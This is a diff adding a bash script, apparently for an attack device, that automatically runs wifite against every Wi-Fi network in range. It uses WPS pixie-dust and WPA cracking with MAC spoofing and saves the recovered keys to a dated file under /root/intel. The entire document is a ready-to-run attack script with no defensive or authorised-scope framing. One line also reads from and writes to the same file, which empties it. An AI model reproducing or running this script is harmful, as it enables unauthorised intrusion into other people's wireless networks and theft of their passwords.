@@ -1,0 +1,16 @@
+#!/bin/bash
+cd /root/scripts
+if [[ $(airmon-ng | grep phy | awk '{print $2}') = *"wlan1"* ]]; then
+	if [ -f /root/scripts/autocrack_wifi.lock ]; then
+		echo "Autocrack_Wifi Locked.  If this is in error please delete /root/scripts/autocrack_wifi.lock"
+	else
+		echo "Scanning and AutoCracking Wifi..."
+		touch /root/scripts/autocrack_wifi.lock
+		wifite -i wlan1 -all -wpst 5 -wpat 30 -mac --pixie --wpsretry 2 --power 20
+		cat cracked.csv /root/intel/wifi_keys-$(date +"%Y%m%d") | uniq > /root/intel/wifi_keys-$(date +"%Y%m%d")
+		rm /root/scripts/cracked.csv
+		yes | rm /root/scripts/autocrack_wifi.lock
+	fi
+else
+	echo "No wlan1 device found.  Exiting."
+fi
